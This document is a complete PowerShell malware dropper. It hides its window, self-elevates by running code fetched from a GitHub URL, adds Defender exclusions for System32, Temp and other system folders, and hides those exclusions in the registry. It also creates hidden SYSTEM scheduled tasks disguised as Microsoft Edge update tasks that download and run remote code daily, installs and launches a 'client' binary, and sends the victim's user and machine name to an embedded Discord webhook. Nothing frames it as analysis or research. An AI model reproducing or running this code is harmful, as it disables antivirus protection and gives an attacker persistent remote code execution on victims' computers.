# --------- #
# VARIABLES 
# --------- #
$install_path = $install_path;
$install_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i"
$update_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/u"
$webhook_url = "1305333146228752536/iggbztKYTfK72bjEd5r0C93T2vksQIkt1x_hXpHfg9A_JXBk8gKNMyTPUsE1myRNPH4y";

# ------------------------------ #
# HIDE CURRENTLY SELECTED WINDOW
# ------------------------------ # 
Add-Type -TypeDefinition @"
using System; 
using System.Runtime.InteropServices; 
public class WindowHelper 
{ 
    [DllImport("user32.dll")] 
    public static extern IntPtr GetForegroundWindow(); 

    [DllImport("user32.dll")] 
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 

    public const int SW_HIDE = 0; 
    public static void HideWindow() 
    { 
        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
    }
}
"@; 
[WindowHelper]::HideWindow();

# ------------------------------------ #
# CHECK IF PROCESS IS RUNNING AS ADMIN
# ------------------------------------ #
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    $newProc = Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr '" + $install_url + "' -UseBasicP)") -Verb RunAs -PassThru;
    $newProc.WaitForExit();
    exit;
}

# ------------------------------------------- #
# ADD EXCLUSIONS TO WINDOWS DEFENDER REGISTRY
# ------------------------------------------- #
$paths = @(
    "C:\Program Files\Windows Defender",
    "C:\Program Files\Windows Defender Advanced Threat Protection",
    "C:\Program Files\Windows NT",
    "C:\Program Files\Windows Security",
    "C:\Program Files\WindowsPowerShell",

    "C:\Program Files (x86)\Internet Explorer",
    "C:\Program Files (x86)\Microsoft",
    "C:\Program Files (x86)\Windows Defender",
    "C:\Program Files (x86)\Windows NT",
    "C:\Program Files (x86)\WindowsPowerShell",

    "C:\Windows\Boot",
    "C:\Windows\SafeBoot",
    "C:\Windows\CSC",
    "C:\Windows\debug",
    "C:\Windows\diagnostics",
    "C:\Windows\Logs",
    "C:\Windows\PLA",
    "C:\Windows\Resources",
    "C:\Windows\security",
    "C:\Windows\System",
    "C:\Windows\System32",
    "C:\Windows\SystemApps",
    "C:\Windows\SystemResources",
    "C:\Windows\SystemTemp",
    "C:\Windows\SysWOW64",
    "C:\Windows\Tasks",
    "C:\Windows\WinSxS",
    "C:\Windows\Temp",
    
    "$env:LOCALAPPDATA\Temp"
);
foreach($path in $paths) {
    try {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue;
    } catch {
        # HANDLE ERRORS
    };
};

# ----------------------------------- #
# HIDE EXCLUSIONS IN WINDOWS SETTINGS
# ----------------------------------- #
$keys = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusionsFromLocalAdmins",
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\HideExclusions"
);
    
foreach ($key in $keys) 
{
    try {
        if (-not (Test-Path $key -ErrorAction SilentlyContinue)) {
            New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null;
            New-ItemProperty -Path $key -Name "Default" -Value 1 -PropertyType "DWORD" -Force -ErrorAction SilentlyContinue | Out-Null;
        } else {
            Set-ItemProperty -Path $key -Name "Default" -Value 1 -Force -ErrorAction SilentlyContinue;
        };
    } 
    catch {
        continue;
    }
};

# ---------------------- #
# ADD NEW SCHEDULED TASK
# ---------------------- #
# Define task parameters
$taskName = "MicrosoftEdgeUpdateTaskMachineMain"
$action = New-ScheduledTaskAction -Execute $install_path -Argument "/c start /min" -WindowStyle Hidden
$trigger = New-ScheduledTaskTrigger -Daily -At "1:00AM"

# Set conditions
$condition = New-ScheduledTaskCondition
$condition.StartWhenAvailable = $false
$condition.Idle = $false
$condition.Power = $true

# Set task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -True `
                                         -DontStopIfGoingOnBatteries -False `
                                         -StartWhenAvailable -False `
                                         -AllowDemandStart -True `
                                         -RestartCount 3 `
                                         -RestartInterval (New-TimeSpan -Minutes 1)

# Create the scheduled task
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Interactive -RunLevel Highest
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Condition $condition

# Register the task
Register-ScheduledTask -TaskName $taskName -InputObject $task -Hidden

Write-Host "Scheduled task '$taskName' created successfully."

# ------------------------- #
# ADD UPDATE SCHEDULED TASK
# ------------------------- #
# Define task parameters
$taskName = "MicrosoftEdgeUpdateTaskMachineHandler";
$argument = '"' + $update_url + '"';
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -Command "iex(iwr ' + $argument + ' -UseBasicP).Content"';
$trigger = New-ScheduledTaskTrigger -Daily -At "1:00AM"

# Set conditions
$condition = New-ScheduledTaskCondition
$condition.StartWhenAvailable = $false
$condition.Idle = $false
$condition.Power = $true

# Set task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -True `
                                         -DontStopIfGoingOnBatteries -False `
                                         -StartWhenAvailable -False `
                                         -AllowDemandStart -True `
                                         -RestartCount 3 `
                                         -RestartInterval (New-TimeSpan -Minutes 1)

# Create the scheduled task
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Interactive -RunLevel Highest
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Condition $condition

# Register the task
Register-ScheduledTask -TaskName $taskName -InputObject $task -Hidden

Write-Host "Scheduled task '$taskName' created successfully."

# ------------------- #
# DOWNLOAD THE CLIENT
# ------------------- #
# Download using BitsTransfer
Start-BitsTransfer -Source $install_url -Destination $install_path -ErrorAction SilentlyContinue;

# Check if client is downloaded;
# if not download it using Invoke-WebRequest
if (-not (Test-Path $install_path)) {
    Invoke-WebRequest -Uri $install_url -OutFile $install_path -ErrorAction SilentlyContinue;
};
    
# ---------------- #
# START THE CLIENT
# ---------------- #
# Test if client is downloaded
if (Test-Path $install_path) 
{
    try {
        Start-Process -FilePath $install_path -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
    } catch  {
        try {
            Start-Process -FilePath $install_path -ErrorAction SilentlyContinue;
        } catch {}
    }
} else {
    # Client is not downloaded (unknown reason);
    $user = $env:USERNAME
    $pcName = $env:COMPUTERNAME
    $message = "$user@$pcName Error installing client"
    $payload = @{
        content = $message
    } | ConvertTo-Json
    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/$webhook_url" -Method Post -ContentType "application/json" -Body $payload
};

exit;
